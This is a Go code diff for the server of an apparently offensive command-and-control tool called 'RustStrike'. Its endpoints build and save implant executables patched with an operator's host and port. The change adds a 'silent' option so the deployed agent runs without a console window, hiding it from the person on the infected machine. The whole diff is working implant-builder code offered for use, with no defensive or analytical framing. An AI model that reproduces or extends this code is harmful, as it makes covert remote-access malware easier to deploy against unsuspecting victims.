@@ -88,48 +88,94 @@ func lastIndex(haystack, needle []byte) int {
 }
 
 // resolveBaseImplantExe finds the prebuilt implant exe: RUSTSTRIKE_IMPLANT_EXE
-// env var, else <exe-dir>/ruststrike-implant.exe, else a repo-relative path.
-func resolveBaseImplantExe() (string, error) {
+// env var, else <exe-dir>/ruststrike-implant[-silent].exe, else a repo-relative
+// path. When `silent` is true it prefers the GUI-subsystem silent variant
+// (no console window on launch); if that's missing it falls back to the
+// console exe so a build without the silent bin still works.
+//
+// `silent` is applied as a sibling-swap on whatever base was resolved: if the
+// resolved base is `ruststrike-implant.exe` (the console build) and a
+// `ruststrike-implant-silent.exe` sits next to it, the silent sibling wins.
+// An explicit override that already points at the silent exe (or a custom
+// name) is left untouched.
+func resolveBaseImplantExe(silent bool) (string, error) {
+	// Candidate names in preference order: silent first when requested.
+	names := []string{"ruststrike-implant.exe"}
+	if silent {
+		names = []string{"ruststrike-implant-silent.exe", "ruststrike-implant.exe"}
+	}
+	// Explicit override (config Paths.ImplantExe) — but honor `silent` by
+	// swapping to the silent sibling if the override points at the console exe.
 	if baseImplantExe != "" {
 		if _, err := os.Stat(baseImplantExe); err == nil {
-			return baseImplantExe, nil
+			return silentSibling(baseImplantExe, silent), nil
 		}
 	}
 	if p := os.Getenv("RUSTSTRIKE_IMPLANT_EXE"); p != "" {
 		if _, err := os.Stat(p); err == nil {
-			return p, nil
+			return silentSibling(p, silent), nil
 		}
 	}
 	if exe, err := os.Executable(); err == nil {
-		cand := filepath.Join(filepath.Dir(exe), "ruststrike-implant.exe")
-		if _, err := os.Stat(cand); err == nil {
-			return cand, nil
+		for _, n := range names {
+			cand := filepath.Join(filepath.Dir(exe), n)
+			if _, err := os.Stat(cand); err == nil {
+				return cand, nil
+			}
 		}
 	}
 	// repo-relative fallback (core runs from clients/server)
-	cand := filepath.Join("..", "..", "target", "release", "ruststrike-implant.exe")
-	if _, err := os.Stat(cand); err == nil {
-		abs, _ := filepath.Abs(cand)
-		return abs, nil
+	for _, n := range names {
+		cand := filepath.Join("..", "..", "target", "release", n)
+		if _, err := os.Stat(cand); err == nil {
+			abs, _ := filepath.Abs(cand)
+			return abs, nil
+		}
 	}
 	return "", errors.New("base implant exe not found (set RUSTSTRIKE_IMPLANT_EXE)")
 }
 
-// stubBuildHandler — POST /api/stub/build body {host, port} -> {exe_b64}.
+// silentSibling returns the path to use for the base implant exe given a
+// `silent` request. If silent is true and `base` is the console exe
+// (ruststrike-implant.exe) with a ruststrike-implant-silent.exe sibling, return
+// the sibling; otherwise return `base` unchanged.
+func silentSibling(base string, silent bool) string {
+	if !silent {
+		return base
+	}
+	dir := filepath.Dir(base)
+	name := filepath.Base(base)
+	if name != "ruststrike-implant.exe" {
+		return base // custom name or already the silent exe — leave as-is
+	}
+	sib := filepath.Join(dir, "ruststrike-implant-silent.exe")
+	if _, err := os.Stat(sib); err == nil {
+		return sib
+	}
+	return base
+}
+
+// stubBuildHandler — POST /api/stub/build body {host, port, silent?} -> {exe_b64}.
+//
+// `silent` (default false) selects the GUI-subsystem base exe so the deployed
+// agent runs with no console window. When true and the silent exe is present,
+// the patched stub is windowless; if the silent exe is missing it falls back
+// to the console exe (still functional, just not hidden).
 func stubBuildHandler(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "POST only", http.StatusMethodNotAllowed)
 		return
 	}
 	var body struct {
-		Host string `json:"host"`
-		Port string `json:"port"`
+		Host   string `json:"host"`
+		Port   string `json:"port"`
+		Silent bool   `json:"silent"`
 	}
 	if err := decodeJSONBody(r, &body); err != nil {
 		http.Error(w, "bad json: "+err.Error(), http.StatusBadRequest)
 		return
 	}
-	base, err := resolveBaseImplantExe()
+	base, err := resolveBaseImplantExe(body.Silent)
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusServiceUnavailable)
 		return
@@ -183,27 +229,28 @@ func safeFileName(name string) string {
 	return name
 }
 
-// stubSaveHandler — POST /api/stub/save body {host, port, name} -> {path, exe_b64}.
+// stubSaveHandler — POST /api/stub/save body {host, port, name, silent?} -> {path, exe_b64}.
 //
 // Writes the patched exe to <repo>/agents/<name>.exe (so a copy lives under
 // the project — gitignored via *.exe) AND returns it base64 so the operator
 // GUI can trigger a browser download too. The agents/ dir is created on first
-// use.
+// use. `silent` selects the GUI-subsystem base exe (no console window).
 func stubSaveHandler(w http.ResponseWriter, r *http.Request) {
 	if r.Method != http.MethodPost {
 		http.Error(w, "POST only", http.StatusMethodNotAllowed)
 		return
 	}
 	var body struct {
-		Host string `json:"host"`
-		Port string `json:"port"`
-		Name string `json:"name"`
+		Host   string `json:"host"`
+		Port   string `json:"port"`
+		Name   string `json:"name"`
+		Silent bool   `json:"silent"`
 	}
 	if err := decodeJSONBody(r, &body); err != nil {
 		http.Error(w, "bad json: "+err.Error(), http.StatusBadRequest)
 		return
 	}
-	base, err := resolveBaseImplantExe()
+	base, err := resolveBaseImplantExe(body.Silent)
 	if err != nil {
 		http.Error(w, err.Error(), http.StatusServiceUnavailable)
 		return
